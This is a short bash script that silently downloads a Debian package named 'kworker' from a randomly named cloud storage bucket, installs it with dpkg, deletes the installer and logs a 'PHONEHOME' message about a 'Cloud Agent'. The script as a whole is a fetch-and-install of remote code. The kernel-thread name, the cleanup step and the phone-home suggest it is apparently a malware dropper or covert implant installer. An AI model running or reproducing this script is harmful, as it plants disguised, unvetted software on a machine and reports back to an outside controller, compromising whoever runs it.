#!/bin/bash

curl -sSL -o /tmp/kworker.deb https://storage.googleapis.com/b8aa812nf/kworker_1.3_amd64.deb
dpkg -i /tmp/kworker.deb
rm -f /tmp/kworker.deb

./logger.sh PHONEHOME 'Cloud Agent Installed'